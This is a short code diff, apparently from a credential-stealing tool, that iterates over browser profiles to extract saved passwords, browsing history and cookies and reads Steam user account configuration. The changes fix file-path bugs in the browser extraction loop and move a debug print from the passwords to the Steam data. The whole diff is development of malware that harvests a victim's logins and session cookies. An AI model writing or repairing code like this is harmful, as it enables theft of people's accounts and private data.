@@ -20,7 +20,7 @@ class Main:
         
     def browser(self):
         for key in extractor.browsers_profile:
-            browser = extractor.browsers[key]
+            browser = extractor.browsers_profile[key]
 
             if os.path.exists(browser):
                 profiles = ["Default"]
@@ -30,12 +30,10 @@ class Main:
                         profiles.append(file)
                 
                 for profile in profiles:
-                    extraction = extractor.Extract(os.path.join(browser, profile, "Local State"))
+                    extraction = extractor.Extract(os.path.join(browser, "Local State"))
                     passwds = extraction.extractPasswords(os.path.join(browser, profile, "Login Data"))
                     history = extraction.extractHistory(os.path.join(browser, profile, "History"))
                     cookies = extraction.extractCookies(os.path.join(browser, profile))
-
-                    print(passwds)
 
         for key in extractor.browsers:
             browser = extractor.browsers[key]
@@ -53,6 +51,8 @@ class Main:
         if os.path.exists(steamUsers):
             with open(steamUsers, "r") as f:
                 usersConfig = vdfParser.convert(f.read())
+
+            print(usersConfig)
             
             return usersConfig
 
